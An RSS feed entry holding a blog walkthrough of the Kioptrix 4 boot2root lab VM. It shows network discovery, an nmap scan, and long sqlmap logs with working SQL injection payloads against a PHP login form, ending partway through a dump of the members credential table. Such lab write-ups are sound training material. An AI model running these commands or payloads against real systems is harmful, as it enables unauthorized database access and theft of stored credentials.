<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Suid on Matt Andreko</title>
    <link>https://www.mattandreko.com/categories/suid/index.xml</link>
    <description>Recent content in Suid on Matt Andreko</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en-US</language>
    <atom:link href="https://www.mattandreko.com/categories/suid/index.xml" rel="self" type="application/rss+xml" />
    
    <item>
      <title>Kioptrix 4</title>
      <link>https://www.mattandreko.com/blog/2012-02-12-kioptrix-4/</link>
      <pubDate>Sun, 12 Feb 2012 22:27:00 -0500</pubDate>
      
      <guid>https://www.mattandreko.com/blog/2012-02-12-kioptrix-4/</guid>
      <description>&lt;p&gt;I know there are a few different methods to the new &lt;a href=&#34;http://www.kioptrix.com/blog/?p=604&#34;&gt;Kioptrix 4&lt;/a&gt; boot2root.  Unfortunately, I could not find the remote root exploit that is mentioned, but my method used several tools, and privilege escalation.&lt;/p&gt;

&lt;!-- more --&gt;

&lt;p&gt;Tools used:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;http://www.backtrack-linux.org&#34;&gt;Backtrack 5 VM&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;http://nmap.org&#34;&gt;Nmap&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;http://sqlmap.org&#34;&gt;SqlMap&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;To start out, I had to find the machine on the network.  I booted up my Backtrack VM and Kioptrix VM both using a NAT connection in my VMWare.  This would put them on the same internal network.  In BackTrack, I first found my IP address:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;root@bt:~# ifconfig
eth1      Link encap:Ethernet  HWaddr 00:0c:29:96:92:1e  
          inet addr:192.168.95.136  Bcast:192.168.95.255  Mask:255.255.255.0
          inet6 addr: fe80::20c:29ff:fe96:921e/64 Scope:Link
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:57480 errors:44807 dropped:0 overruns:0 frame:0
          TX packets:193847 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000 
          RX bytes:14079464 (14.0 MB)  TX bytes:14077265 (14.0 MB)
          Interrupt:19 Base address:0x2024 

lo        Link encap:Local Loopback  
          inet addr:127.0.0.1  Mask:255.0.0.0
          inet6 addr: ::1/128 Scope:Host
          UP LOOPBACK RUNNING  MTU:16436  Metric:1
          RX packets:136257 errors:0 dropped:0 overruns:0 frame:0
          TX packets:136257 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:0 
          RX bytes:26029235 (26.0 MB)  TX bytes:26029235 (26.0 MB)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Using this information, I scanned the subnet for other devices:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;root@bt:~# netdiscover -r 192.168.95.0/24

 Currently scanning: Finished!   |   Screen View: Unique Hosts                 
                                                                               
 4 Captured ARP Req/Rep packets, from 4 hosts.   Total size: 240               
 _____________________________________________________________________________
   IP            At MAC Address      Count  Len   MAC Vendor                   
 ----------------------------------------------------------------------------- 
 192.168.95.1    00:50:56:c0:00:08    01    060   VMWare, Inc.                 
 192.168.95.2    00:50:56:f1:ea:a0    01    060   VMWare, Inc.                 
 192.168.95.131  00:0c:29:03:da:8f    01    060   VMware, Inc.                 
 192.168.95.254  00:50:56:fb:ac:b6    01    060   VMWare, Inc.  
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;I figured out of that list, that 1, 2, and 254 were reserved ones, and that 192.168.95.131 would be my Kioptrix VM.  So I did a port scan.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;root@bt:~# nmap -sV 192.168.95.131

Starting Nmap 5.61TEST4 ( http://nmap.org ) at 2012-02-12 14:03 EST
Nmap scan report for 192.168.95.131
Host is up (0.00011s latency).
Not shown: 566 closed ports, 430 filtered ports
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1.2 (protocol 2.0)
80/tcp  open  http        Apache httpd 2.2.8 ((Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch)
139/tcp open  netbios-ssn Samba smbd 3.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 3.X (workgroup: WORKGROUP)
MAC Address: 00:0C:29:03:DA:8F (VMware)
Service Info: OS: Linux; CPE: cpe:/o:linux:kernel

Service detection performed. Please report any incorrect results at http://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 26.42 seconds
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;I started to poke around.  Since HTTP is often times the easiest for me, I started there.  I went to http://&lt;nolink&gt;192.168.95.131 and was presented with a basic login screen (and a cute goat).  I attempted to use the username of &amp;ldquo;admin&amp;rdquo;, with the same password, &amp;ldquo;admin&amp;rdquo;.  It redirected me to a password failure page, located at http://&lt;nolink&gt;192.168.95.131/checklogin.php.  I used the Firefox extension, Tamper Data, to double-check the POST query-string.  It showed, &amp;ldquo;myusername=admin&amp;amp;mypassword=admin&amp;amp;Submit=Login&amp;rdquo;.&lt;/p&gt;

&lt;p&gt;My instincts told me that I should attempt some sql injection on these login screens.  I tinkered with some of the basic ones I remembered off the top of my head, but none of them worked.  It did show promise though, as I received several errors in the process.  This meant it was time for the big guns.&lt;/p&gt;

&lt;p&gt;SqlMap is a tool that I&amp;rsquo;m not super familiar with, but will definitely be learning more about.  It&amp;rsquo;s very powerful, even in the hand of a beginner.  I used the url that I posted to, and specified a few options, and just watched it go:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;root@bt:/pentest/database/sqlmap# ./sqlmap.py -u http://192.168.95.131/checklogin.php --data=&amp;quot;myusername=admin&amp;amp;mypassword=admin&amp;amp;Submit=Login&amp;quot; --level=5 --risk=3 --dbs

    sqlmap/1.0-dev (r4739) - automatic SQL injection and database takeover tool
    http://www.sqlmap.org

[!] legal disclaimer: usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user&#39;s responsibility to obey all applicable local, state and federal laws. Authors assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting at 20:42:28

[20:42:28] [INFO] using &#39;/pentest/database/sqlmap/output/192.168.95.131/session&#39; as session file
[20:42:28] [INFO] testing connection to the target url
[20:42:28] [INFO] heuristics detected web page charset &#39;ascii&#39;
[20:42:28] [INFO] testing if the url is stable, wait a few seconds
[20:42:29] [INFO] url is stable
[20:42:29] [INFO] testing if POST parameter &#39;myusername&#39; is dynamic
[20:42:29] [WARNING] POST parameter &#39;myusername&#39; appears to be not dynamic
[20:42:29] [WARNING] heuristic test shows that POST parameter &#39;myusername&#39; might not be injectable
[20:42:29] [INFO] testing sql injection on POST parameter &#39;myusername&#39;
[20:42:29] [INFO] testing &#39;AND boolean-based blind - WHERE or HAVING clause&#39;
[20:42:30] [INFO] testing &#39;AND boolean-based blind - WHERE or HAVING clause (MySQL comment)&#39;
[20:42:30] [INFO] testing &#39;AND boolean-based blind - WHERE or HAVING clause (Generic comment)&#39;
[20:42:31] [INFO] testing &#39;OR boolean-based blind - WHERE or HAVING clause&#39;
[20:42:31] [INFO] testing &#39;OR boolean-based blind - WHERE or HAVING clause (MySQL comment)&#39;
[20:42:32] [INFO] testing &#39;OR boolean-based blind - WHERE or HAVING clause (Generic comment)&#39;
[20:42:32] [INFO] testing &#39;MySQL boolean-based blind - WHERE or HAVING clause (RLIKE)&#39;
[20:42:32] [INFO] testing &#39;Generic boolean-based blind - Parameter replace (original value)&#39;
[20:42:32] [INFO] testing &#39;MySQL boolean-based blind - Parameter replace (MAKE_SET - original value)&#39;
[20:42:32] [INFO] testing &#39;MySQL boolean-based blind - Parameter replace (ELT - original value)&#39;
[20:42:32] [INFO] testing &#39;MySQL boolean-based blind - Parameter replace (bool*int - original value)&#39;
[20:42:32] [INFO] testing &#39;MySQL &amp;gt;= 5.0 boolean-based blind - Parameter replace (original value)&#39;
[20:42:32] [INFO] testing &#39;MySQL &amp;lt; 5.0 boolean-based blind - Parameter replace (original value)&#39;
[20:42:32] [INFO] testing &#39;PostgreSQL boolean-based blind - Parameter replace (GENERATE_SERIES - original value)&#39;
[20:42:32] [INFO] testing &#39;Microsoft SQL Server/Sybase boolean-based blind - Parameter replace (original value)&#39;
[20:42:32] [INFO] testing &#39;Oracle boolean-based blind - Parameter replace (original value)&#39;
[20:42:33] [INFO] testing &#39;Microsoft Access boolean-based blind - Parameter replace (original value)&#39;
[20:42:33] [INFO] testing &#39;SAP MaxDB boolean-based blind - Parameter replace (original value)&#39;
[20:42:33] [INFO] testing &#39;Generic boolean-based blind - GROUP BY and ORDER BY clauses&#39;
[20:42:33] [INFO] testing &#39;Generic boolean-based blind - GROUP BY and ORDER BY clauses (original value)&#39;
[20:42:33] [INFO] testing &#39;MySQL &amp;gt;= 5.0 boolean-based blind - GROUP BY and ORDER BY clauses&#39;
[20:42:33] [INFO] testing &#39;MySQL &amp;lt; 5.0 boolean-based blind - GROUP BY and ORDER BY clauses&#39;
[20:42:33] [INFO] testing &#39;Microsoft SQL Server/Sybase boolean-based blind - ORDER BY clause&#39;
[20:42:33] [INFO] testing &#39;Oracle boolean-based blind - GROUP BY and ORDER BY clauses&#39;
[20:42:33] [INFO] testing &#39;Microsoft Access boolean-based blind - GROUP BY and ORDER BY clauses&#39;
[20:42:33] [INFO] testing &#39;MySQL stacked conditional-error blind queries&#39;
[20:42:33] [INFO] testing &#39;PostgreSQL stacked conditional-error blind queries&#39;
[20:42:33] [INFO] testing &#39;Microsoft SQL Server/Sybase stacked conditional-error blind queries&#39;
[20:42:34] [INFO] testing &#39;MySQL &amp;gt;= 5.0 AND error-based - WHERE or HAVING clause&#39;
[20:42:34] [INFO] testing &#39;MySQL &amp;gt;= 5.1 AND error-based - WHERE or HAVING clause (EXTRACTVALUE)&#39;
[20:42:34] [INFO] testing &#39;MySQL &amp;gt;= 5.1 AND error-based - WHERE or HAVING clause (UPDATEXML)&#39;
[20:42:34] [INFO] testing &#39;MySQL &amp;gt;= 4.1 AND error-based - WHERE or HAVING clause&#39;
[20:42:35] [INFO] testing &#39;PostgreSQL AND error-based - WHERE or HAVING clause&#39;
[20:42:35] [INFO] testing &#39;Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause&#39;
[20:42:35] [INFO] testing &#39;Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)&#39;
[20:42:35] [INFO] testing &#39;Oracle AND error-based - WHERE or HAVING clause (XMLType)&#39;
[20:42:35] [INFO] testing &#39;Oracle AND error-based - WHERE or HAVING clause (utl_inaddr.get_host_address)&#39;
[20:42:35] [INFO] testing &#39;Oracle AND error-based - WHERE or HAVING clause (ctxsys.drithsx.sn)&#39;
[20:42:35] [INFO] testing &#39;Firebird AND error-based - WHERE or HAVING clause&#39;
[20:42:36] [INFO] testing &#39;MySQL &amp;gt;= 5.0 OR error-based - WHERE or HAVING clause&#39;
[20:42:36] [INFO] testing &#39;MySQL &amp;gt;= 5.1 OR error-based - WHERE or HAVING clause (EXTRACTVALUE)&#39;
[20:42:36] [INFO] testing &#39;MySQL &amp;gt;= 5.1 OR error-based - WHERE or HAVING clause (UPDATEXML)&#39;
[20:42:36] [INFO] testing &#39;MySQL &amp;gt;= 4.1 OR error-based - WHERE or HAVING clause&#39;
[20:42:36] [INFO] testing &#39;MySQL OR error-based - WHERE or HAVING clause&#39;
[20:42:36] [INFO] testing &#39;PostgreSQL OR error-based - WHERE or HAVING clause&#39;
[20:42:37] [INFO] testing &#39;Microsoft SQL Server/Sybase OR error-based - WHERE or HAVING clause&#39;
[20:42:37] [INFO] testing &#39;Microsoft SQL Server/Sybase OR error-based - WHERE or HAVING clause (IN)&#39;
[20:42:37] [INFO] testing &#39;Oracle OR error-based - WHERE or HAVING clause (XMLType)&#39;
[20:42:37] [INFO] testing &#39;Oracle OR error-based - WHERE or HAVING clause (utl_inaddr.get_host_address)&#39;
[20:42:38] [INFO] testing &#39;Oracle OR error-based - WHERE or HAVING clause (ctxsys.drithsx.sn)&#39;
[20:42:38] [INFO] testing &#39;Firebird OR error-based - WHERE or HAVING clause&#39;
[20:42:38] [INFO] testing &#39;MySQL &amp;gt;= 5.0 error-based - Parameter replace&#39;
[20:42:38] [INFO] testing &#39;MySQL &amp;gt;= 5.1 error-based - Parameter replace (EXTRACTVALUE)&#39;
[20:42:38] [INFO] testing &#39;MySQL &amp;gt;= 5.1 error-based - Parameter replace (UPDATEXML)&#39;
[20:42:38] [INFO] testing &#39;PostgreSQL error-based - Parameter replace&#39;
[20:42:38] [INFO] testing &#39;Microsoft SQL Server/Sybase error-based - Parameter replace&#39;
[20:42:38] [INFO] testing &#39;Oracle error-based - Parameter replace&#39;
[20:42:38] [INFO] testing &#39;Firebird error-based - Parameter replace&#39;
[20:42:38] [INFO] testing &#39;MySQL &amp;gt;= 5.0 error-based - GROUP BY and ORDER BY clauses&#39;
[20:42:38] [INFO] testing &#39;MySQL &amp;gt;= 5.1 error-based - GROUP BY and ORDER BY clauses (EXTRACTVALUE)&#39;
[20:42:38] [INFO] testing &#39;MySQL &amp;gt;= 5.1 error-based - GROUP BY and ORDER BY clauses (UPDATEXML)&#39;
[20:42:38] [INFO] testing &#39;PostgreSQL error-based - GROUP BY and ORDER BY clauses&#39;
[20:42:38] [INFO] testing &#39;Microsoft SQL Server/Sybase error-based - ORDER BY clause&#39;
[20:42:38] [INFO] testing &#39;Oracle error-based - GROUP BY and ORDER BY clauses&#39;
[20:42:38] [INFO] testing &#39;MySQL &amp;gt; 5.0.11 stacked queries&#39;
[20:42:38] [INFO] testing &#39;MySQL &amp;lt; 5.0.12 stacked queries (heavy query)&#39;
[20:42:38] [INFO] testing &#39;PostgreSQL &amp;gt; 8.1 stacked queries&#39;
[20:42:39] [INFO] testing &#39;PostgreSQL stacked queries (heavy query)&#39;
[20:42:39] [INFO] testing &#39;PostgreSQL &amp;lt; 8.2 stacked queries (Glibc)&#39;
[20:42:39] [INFO] testing &#39;Microsoft SQL Server/Sybase stacked queries&#39;
[20:42:39] [INFO] testing &#39;Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE)&#39;
[20:42:39] [INFO] testing &#39;Oracle stacked queries (heavy query)&#39;
[20:42:39] [INFO] testing &#39;Oracle stacked queries (DBMS_LOCK.SLEEP)&#39;
[20:42:39] [INFO] testing &#39;Oracle stacked queries (USER_LOCK.SLEEP)&#39;
[20:42:40] [INFO] testing &#39;SQLite &amp;gt; 2.0 stacked queries (heavy query)&#39;
[20:42:40] [INFO] testing &#39;Firebird stacked queries (heavy query)&#39;
[20:42:40] [INFO] testing &#39;MySQL &amp;gt; 5.0.11 AND time-based blind&#39;
[20:42:40] [INFO] testing &#39;MySQL &amp;gt; 5.0.11 AND time-based blind (comment)&#39;
[20:42:40] [INFO] testing &#39;MySQL &amp;lt; 5.0.12 AND time-based blind (heavy query)&#39;
[20:42:40] [INFO] testing &#39;MySQL &amp;lt; 5.0.12 AND time-based blind (heavy query - comment)&#39;
[20:42:40] [INFO] testing &#39;PostgreSQL &amp;gt; 8.1 AND time-based blind&#39;
[20:42:41] [INFO] testing &#39;PostgreSQL &amp;gt; 8.1 AND time-based blind (comment)&#39;
[20:42:41] [INFO] testing &#39;PostgreSQL AND time-based blind (heavy query)&#39;
[20:42:41] [INFO] testing &#39;PostgreSQL AND time-based blind (heavy query - comment)&#39;
[20:42:41] [INFO] testing &#39;Microsoft SQL Server/Sybase time-based blind&#39;
[20:42:41] [INFO] POST parameter &#39;myusername&#39; is &#39;Microsoft SQL Server/Sybase time-based blind&#39; injectable 
[20:42:41] [INFO] testing &#39;MySQL UNION query (NULL) - 1 to 10 columns&#39;
[20:42:41] [INFO] testing &#39;MySQL UNION query (random number) - 1 to 10 columns&#39;
[20:42:41] [INFO] testing &#39;MySQL UNION query (NULL) - 11 to 20 columns&#39;
[20:42:41] [INFO] testing &#39;MySQL UNION query (random number) - 11 to 20 columns&#39;
[20:42:41] [INFO] testing &#39;MySQL UNION query (NULL) - 21 to 30 columns&#39;
[20:42:41] [INFO] testing &#39;MySQL UNION query (random number) - 21 to 30 columns&#39;
[20:42:41] [INFO] testing &#39;MySQL UNION query (NULL) - 31 to 40 columns&#39;
[20:42:41] [INFO] testing &#39;MySQL UNION query (random number) - 31 to 40 columns&#39;
[20:42:41] [INFO] testing &#39;MySQL UNION query (NULL) - 41 to 50 columns&#39;
[20:42:41] [INFO] testing &#39;MySQL UNION query (random number) - 41 to 50 columns&#39;
[20:42:42] [INFO] testing &#39;Generic UNION query (NULL) - 1 to 10 columns&#39;
[20:42:42] [INFO] testing &#39;Generic UNION query (random number) - 1 to 10 columns&#39;
[20:42:42] [INFO] testing &#39;Generic UNION query (NULL) - 11 to 20 columns&#39;
[20:42:42] [INFO] testing &#39;Generic UNION query (random number) - 11 to 20 columns&#39;
[20:42:42] [INFO] testing &#39;Generic UNION query (NULL) - 21 to 30 columns&#39;
[20:42:42] [INFO] testing &#39;Generic UNION query (random number) - 21 to 30 columns&#39;
[20:42:42] [INFO] testing &#39;Generic UNION query (NULL) - 31 to 40 columns&#39;
[20:42:42] [INFO] testing &#39;Generic UNION query (random number) - 31 to 40 columns&#39;
[20:42:42] [INFO] testing &#39;Generic UNION query (NULL) - 41 to 50 columns&#39;
[20:42:42] [INFO] testing &#39;Generic UNION query (random number) - 41 to 50 columns&#39;
[20:42:42] [INFO] testing &#39;Generic UNION query (NUL comment) (NULL) - 1 to 10 columns&#39;
[20:42:42] [INFO] testing &#39;Generic UNION query (NUL comment) (random number) - 1 to 10 columns&#39;
[20:42:42] [INFO] testing &#39;Generic UNION query (NUL comment) (NULL) - 11 to 20 columns&#39;
[20:42:42] [INFO] testing &#39;Generic UNION query (NUL comment) (random number) - 11 to 20 columns&#39;
[20:42:42] [INFO] testing &#39;Generic UNION query (NUL comment) (NULL) - 21 to 30 columns&#39;
[20:42:42] [INFO] testing &#39;Generic UNION query (NUL comment) (random number) - 21 to 30 columns&#39;
[20:42:42] [INFO] testing &#39;Generic UNION query (NUL comment) (NULL) - 31 to 40 columns&#39;
[20:42:42] [INFO] testing &#39;Generic UNION query (NUL comment) (random number) - 31 to 40 columns&#39;
[20:42:42] [INFO] testing &#39;Generic UNION query (NUL comment) (NULL) - 41 to 50 columns&#39;
[20:42:42] [INFO] testing &#39;Generic UNION query (NUL comment) (random number) - 41 to 50 columns&#39;
[20:42:43] [INFO] checking if the injection point on POST parameter &#39;myusername&#39; is a false positive
[20:42:43] [WARNING] false positive injection point detected
[20:42:43] [WARNING] POST parameter &#39;myusername&#39; is not injectable
[20:42:43] [INFO] testing if POST parameter &#39;mypassword&#39; is dynamic
[20:42:43] [WARNING] POST parameter &#39;mypassword&#39; appears to be not dynamic
[20:42:43] [INFO] heuristic test shows that POST parameter &#39;mypassword&#39; might be injectable (possible DBMS: MySQL)
[20:42:43] [INFO] testing sql injection on POST parameter &#39;mypassword&#39;
[20:42:43] [INFO] testing &#39;AND boolean-based blind - WHERE or HAVING clause&#39;
sqlmap got a 302 redirect to &#39;http://192.168.95.131:80/login_success.php&#39;. What do you want to do? 
[1] Follow the redirection (default)
[2] Stay on the original page
[3] Ignore
&amp;gt; 2
[20:42:50] [INFO] testing &#39;AND boolean-based blind - WHERE or HAVING clause (Generic comment)&#39;
[20:42:51] [INFO] testing &#39;OR boolean-based blind - WHERE or HAVING clause&#39;
[20:42:51] [INFO] POST parameter &#39;mypassword&#39; is &#39;OR boolean-based blind - WHERE or HAVING clause&#39; injectable 
[20:42:51] [INFO] testing &#39;MySQL &amp;gt;= 5.0 AND error-based - WHERE or HAVING clause&#39;
[20:42:51] [INFO] testing &#39;MySQL &amp;gt;= 5.1 AND error-based - WHERE or HAVING clause (EXTRACTVALUE)&#39;
[20:42:51] [INFO] testing &#39;MySQL &amp;gt;= 5.1 AND error-based - WHERE or HAVING clause (UPDATEXML)&#39;
[20:42:51] [INFO] testing &#39;MySQL &amp;gt;= 4.1 AND error-based - WHERE or HAVING clause&#39;
[20:42:51] [INFO] testing &#39;MySQL &amp;gt;= 5.0 OR error-based - WHERE or HAVING clause&#39;
[20:42:51] [INFO] testing &#39;MySQL &amp;gt;= 5.1 OR error-based - WHERE or HAVING clause (EXTRACTVALUE)&#39;
[20:42:51] [INFO] testing &#39;MySQL &amp;gt;= 5.1 OR error-based - WHERE or HAVING clause (UPDATEXML)&#39;
[20:42:51] [INFO] testing &#39;MySQL &amp;gt;= 4.1 OR error-based - WHERE or HAVING clause&#39;
[20:42:51] [INFO] testing &#39;MySQL OR error-based - WHERE or HAVING clause&#39;
[20:42:51] [INFO] testing &#39;MySQL &amp;gt;= 5.0 error-based - Parameter replace&#39;
[20:42:51] [INFO] testing &#39;MySQL &amp;gt;= 5.1 error-based - Parameter replace (EXTRACTVALUE)&#39;
[20:42:51] [INFO] testing &#39;MySQL &amp;gt;= 5.1 error-based - Parameter replace (UPDATEXML)&#39;
[20:42:51] [INFO] testing &#39;MySQL &amp;gt; 5.0.11 stacked queries&#39;
[20:42:51] [INFO] testing &#39;MySQL &amp;lt; 5.0.12 stacked queries (heavy query)&#39;
[20:42:51] [INFO] testing &#39;MySQL &amp;gt; 5.0.11 AND time-based blind&#39;
[20:42:51] [INFO] testing &#39;MySQL &amp;gt; 5.0.11 AND time-based blind (comment)&#39;
[20:42:51] [INFO] testing &#39;MySQL &amp;lt; 5.0.12 AND time-based blind (heavy query)&#39;
[20:43:03] [INFO] POST parameter &#39;mypassword&#39; is &#39;MySQL &amp;lt; 5.0.12 AND time-based blind (heavy query)&#39; injectable 
[20:43:03] [INFO] testing &#39;MySQL UNION query (NULL) - 1 to 10 columns&#39;
[20:43:03] [INFO] ORDER BY technique seems to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for UNION query injection technique
[20:43:03] [INFO] target url appears to have 3 columns in query
[20:43:04] [WARNING] if UNION based SQL injection is not detected, please consider usage of option &#39;--union-char&#39; (e.g. --union-char=1) and/or try to force the back-end DBMS (e.g. --dbms=mysql) 
[20:43:04] [INFO] testing &#39;MySQL UNION query (random number) - 1 to 10 columns&#39;
[20:43:04] [INFO] testing &#39;MySQL UNION query (NULL) - 11 to 20 columns&#39;
[20:43:04] [INFO] testing &#39;MySQL UNION query (random number) - 11 to 20 columns&#39;
[20:43:04] [INFO] testing &#39;MySQL UNION query (NULL) - 21 to 30 columns&#39;
[20:43:04] [INFO] testing &#39;MySQL UNION query (random number) - 21 to 30 columns&#39;
[20:43:04] [INFO] testing &#39;MySQL UNION query (NULL) - 31 to 40 columns&#39;
[20:43:04] [INFO] testing &#39;MySQL UNION query (random number) - 31 to 40 columns&#39;
[20:43:04] [INFO] testing &#39;MySQL UNION query (NULL) - 41 to 50 columns&#39;
[20:43:04] [INFO] testing &#39;MySQL UNION query (random number) - 41 to 50 columns&#39;
[20:43:04] [INFO] testing &#39;Generic UNION query (NULL) - 1 to 10 columns&#39;
[20:43:04] [INFO] testing &#39;Generic UNION query (random number) - 1 to 10 columns&#39;
[20:43:04] [INFO] testing &#39;Generic UNION query (NULL) - 11 to 20 columns&#39;
[20:43:04] [INFO] testing &#39;Generic UNION query (random number) - 11 to 20 columns&#39;
[20:43:04] [INFO] testing &#39;Generic UNION query (NULL) - 21 to 30 columns&#39;
[20:43:04] [INFO] testing &#39;Generic UNION query (random number) - 21 to 30 columns&#39;
[20:43:05] [INFO] testing &#39;Generic UNION query (NULL) - 31 to 40 columns&#39;
[20:43:05] [INFO] testing &#39;Generic UNION query (random number) - 31 to 40 columns&#39;
[20:43:05] [INFO] testing &#39;Generic UNION query (NULL) - 41 to 50 columns&#39;
[20:43:05] [INFO] testing &#39;Generic UNION query (random number) - 41 to 50 columns&#39;
[20:43:05] [INFO] testing &#39;Generic UNION query (NUL comment) (NULL) - 1 to 10 columns&#39;
[20:43:05] [INFO] testing &#39;Generic UNION query (NUL comment) (random number) - 1 to 10 columns&#39;
[20:43:05] [INFO] testing &#39;Generic UNION query (NUL comment) (NULL) - 11 to 20 columns&#39;
[20:43:05] [INFO] testing &#39;Generic UNION query (NUL comment) (random number) - 11 to 20 columns&#39;
[20:43:05] [INFO] testing &#39;Generic UNION query (NUL comment) (NULL) - 21 to 30 columns&#39;
[20:43:05] [INFO] testing &#39;Generic UNION query (NUL comment) (random number) - 21 to 30 columns&#39;
[20:43:05] [INFO] testing &#39;Generic UNION query (NUL comment) (NULL) - 31 to 40 columns&#39;
[20:43:05] [INFO] testing &#39;Generic UNION query (NUL comment) (random number) - 31 to 40 columns&#39;
[20:43:05] [INFO] testing &#39;Generic UNION query (NUL comment) (NULL) - 41 to 50 columns&#39;
[20:43:05] [INFO] testing &#39;Generic UNION query (NUL comment) (random number) - 41 to 50 columns&#39;
[20:43:05] [WARNING] in OR boolean-based injections, please consider usage of switch &#39;--drop-set-cookie&#39; if you experience any problems during data retrieval
POST parameter &#39;mypassword&#39; is vulnerable. Do you want to keep testing the others? [Y/n] n
sqlmap identified the following injection points with a total of 3697 HTTP(s) requests:
---
Place: POST
Parameter: mypassword
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause
    Payload: myusername=admin&amp;amp;mypassword=-5618&#39; OR NOT (5039=5039) AND &#39;Gndx&#39;=&#39;Gndx&amp;amp;Submit=Login

    Type: AND/OR time-based blind
    Title: MySQL &amp;lt; 5.0.12 AND time-based blind (heavy query)
    Payload: myusername=admin&amp;amp;mypassword=admin&#39; AND 9312=BENCHMARK(5000000,MD5(0x57485477)) AND &#39;lxSR&#39;=&#39;lxSR&amp;amp;Submit=Login
---

[20:43:11] [INFO] testing MySQL
[20:43:11] [INFO] confirming MySQL
[20:43:11] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 8.04 (Hardy Heron)
web application technology: PHP 5.2.4, Apache 2.2.8
back-end DBMS: MySQL &amp;gt;= 5.0.0
[20:43:11] [INFO] fetching database names
[20:43:11] [INFO] fetching number of databases
[20:43:11] [WARNING] running in a single-thread mode. Please consider usage of option &#39;--threads&#39; for faster data retrieval
[20:43:11] [INFO] retrieved: 3
[20:43:11] [INFO] retrieved: information_schema
[20:43:12] [INFO] retrieved: members
[20:43:13] [INFO] retrieved: mysql
available databases [3]:
[*] information_schema
[*] members
[*] mysql

[20:43:13] [INFO] Fetched data logged to text files under &#39;/pentest/database/sqlmap/output/192.168.95.131&#39;

[*] shutting down at 20:43:13
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;During this run, you can see that it prompted me only 2 times.  Once because it was redirected, and asked if I wanted to stay on the same page or follow the redirect.  Another because it found that &amp;ldquo;mypassword&amp;rdquo; was injectable, and wanted to know if I wanted to try some others.  I didn&amp;rsquo;t care about any other pages, or any other variables if the first one worked.&lt;/p&gt;

&lt;p&gt;This gave me 3 MySQL databases, &amp;ldquo;information_schema&amp;rdquo;, &amp;ldquo;mysql&amp;rdquo;, and &amp;ldquo;members&amp;rdquo;.  The first two are default in MySQL installations, but the last probably has to do with the Kioptrix VM.  So I decided to go further with the &amp;ldquo;members&amp;rdquo; database.  I opted to dump all the data in the &amp;ldquo;members&amp;rdquo; database.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;root@bt:/pentest/database/sqlmap# ./sqlmap.py -u http://192.168.95.131/checklogin.php --data=&amp;quot;myusername=admin&amp;amp;mypassword=admin&amp;amp;Submit=Login&amp;quot; --level=5 --risk=3 -D members --dump

    sqlmap/1.0-dev (r4739) - automatic SQL injection and database takeover tool
    http://www.sqlmap.org

[!] legal disclaimer: usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user&#39;s responsibility to obey all applicable local, state and federal laws. Authors assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting at 20:48:45

[20:48:46] [INFO] using &#39;/pentest/database/sqlmap/output/192.168.95.131/session&#39; as session file
[20:48:46] [INFO] resuming injection data from session file
[20:48:46] [INFO] resuming back-end DBMS &#39;mysql 5&#39; from session file
[20:48:46] [INFO] testing connection to the target url
[20:48:46] [INFO] heuristics detected web page charset &#39;ascii&#39;
sqlmap identified the following injection points with a total of 0 HTTP(s) requests:
---
Place: POST
Parameter: mypassword
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause
    Payload: myusername=admin&amp;amp;mypassword=-5618&#39; OR NOT (5039=5039) AND &#39;Gndx&#39;=&#39;Gndx&amp;amp;Submit=Login

    Type: AND/OR time-based blind
    Title: MySQL &amp;lt; 5.0.12 AND time-based blind (heavy query)
    Payload: myusername=admin&amp;amp;mypassword=admin&#39; AND 9312=BENCHMARK(5000000,MD5(0x57485477)) AND &#39;lxSR&#39;=&#39;lxSR&amp;amp;Submit=Login
---

[20:48:46] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 8.04 (Hardy Heron)
web application technology: PHP 5.2.4, Apache 2.2.8
back-end DBMS: MySQL 5
[20:48:46] [INFO] fetching tables for database: members
[20:48:46] [INFO] fetching number of tables for database &#39;members&#39;
[20:48:46] [WARNING] running in a single-thread mode. Please consider usage of option &#39;--threads&#39; for faster data retrieval
sqlmap got a 302 redirect to &#39;http://192.168.95.131:80/login_success.php&#39;. What do you want to do? 
[1] Follow the redirection (default)
[2] Stay on the original page
[3] Ignore
&amp;gt; 2
1
[20:48:48] [INFO] retrieved: members
[20:48:48] [INFO] fetching columns for table &#39;members&#39; on database &#39;members&#39;
[20:48:48] [INFO] retrieved: 3
[20:48:48] [INFO] retrieved: id
[20:48:49] [INFO] retrieved: username
[20:48:49] [INFO] retrieved: password
[20:48:50] [INFO] fetching entries for table &#39;members&#39; on database &#39;members&#39;
